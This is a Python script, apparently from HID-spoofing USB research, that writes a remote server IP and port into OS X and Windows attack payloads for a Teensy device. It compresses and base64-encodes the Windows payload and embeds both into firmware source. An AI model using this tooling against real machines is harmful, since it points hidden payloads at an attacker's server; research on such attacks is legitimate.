'''
Small Utility for configuring the Teensy payload remote server IP and PORT

 * @see: https://www.elie.net/malusb for more information on HID spoofing devices.
 * @authors Elie Bursztein (contact@elie.net),  Jean Michel Picod (jmichel.p@gmail.com)
 * @licence: GPL v3
'''

import sys
from subprocess import Popen, PIPE

if len(sys.argv) != 3:
    print "usage: payload_configurator.py IP PORT"
    sys.exit(0)

IP = sys.argv[1]
PORT = sys.argv[2]
print "Configuring paylaod with IP:%s Port:%s" % (IP, PORT)

# Configuring OSX payload
try:
    osx_payload = open("payload_osx.sh").read()
except:
    print "can't find payload_osx.sh"
    sys.exit(-1)
osx_payload = osx_payload.replace("IP", IP)
osx_payload = osx_payload.replace("PORT", PORT)

# Configuring  Windows payload
# Configuring OSX payload
try:
    win_payload = open("payload_win.ps").read()
except:
    print "can't find payload_win.ps"
    sys.exit(-1)
win_payload = win_payload.replace("IP", IP)
win_payload = win_payload.replace("PORT", PORT)
#dump configure payload
f = open("payload_win_configured.ps", "w+")
f.write(win_payload)
f.close()
#compress and base 64
process = Popen(['cat payload_win_configured.ps | gzip -c | base64'], stdout=PIPE, stderr=PIPE, shell=True)
stdout, stderr = process.communicate()
win_compressed_payload = stdout.strip()

#configure payload.c
# Configuring OSX payload
try:
    payload = open("payload.c").read()
except:
    print "can't find payload.c"
    sys.exit(-1)
payload = payload.replace("OSX_PAYLOAD_STR", osx_payload)
payload = payload.replace("WIN_PAYLOAD_STR", win_compressed_payload)
# dump final paylaod
#dump configure payload
f = open("payload_configured.c", "w+")
f.write(payload)
f.close()
